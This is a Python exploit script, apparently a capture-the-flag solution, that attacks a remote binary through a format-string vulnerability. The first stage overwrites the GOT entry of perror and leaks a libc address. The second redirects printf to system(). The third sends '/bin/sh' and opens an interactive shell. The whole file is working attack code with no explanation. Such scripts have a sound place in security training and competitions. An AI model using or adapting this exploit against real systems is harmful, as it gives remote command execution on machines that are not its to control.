from ptrlib import *

elf = ELF("./simple")
libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")
diff = 0xf0
sock = Socket("51.254.114.246", 4444)
#libc = ELF("/lib64/libc.so.6")
#diff = 0xf5
#sock = Socket("127.0.0.1", 4000)
_ = input()

addr_main = elf.symbol("main")
got_perror = elf.got("perror")
got_printf = elf.got("printf")

""" Stage 1 """
writes = {}
for i in range(2):
    writes[got_perror + i] = (addr_main >> (8 * i)) & 0xFF
payload = '%17$p....'
offset = 6 + 32 // 8
n = 4 + 14
for (i, addr) in enumerate(writes):
    l = (writes[addr] - n - 1) % 256 + 1
    payload += '%{}c%{}$hhn'.format(l, offset + i)
    n += l
assert len(payload) == (offset - 6) * 8
payload = str2bytes(payload)
for addr in writes:
    payload += p64(addr)
assert len(payload) < 0x40
payload = payload + b'\x00' * (0x3f - len(payload))
sock.send(payload)
addr = int(sock.recvuntil(".").rstrip(b"."), 16)
libc_base = addr - libc.symbol("__libc_start_main") - diff
addr_system = libc_base + libc.symbol("system")
dump("libc base = " + hex(libc_base))

""" Stage 2 """
writes = {}
for i in range(3):
    writes[got_printf + i] = (addr_system >> (8 * i)) & 0xFF
payload = ''
offset = 6 + 40 // 8
n = 0
for (i, addr) in enumerate(writes):
    l = (writes[addr] - n - 1) % 256 + 1
    payload += '%{}c%{}$hhn'.format(l, offset + i)
    n += l
payload += 'A' * (40 - len(payload))
assert len(payload) == (offset - 6) * 8
payload = str2bytes(payload)
for addr in writes:
    payload += p64(addr)
assert len(payload) <= 0x40
payload = payload + b'\x00' * (0x3f - len(payload))
sock.send(payload)

""" Stage 3 """
sock.send("/bin/sh\x00")
sock.interactive()
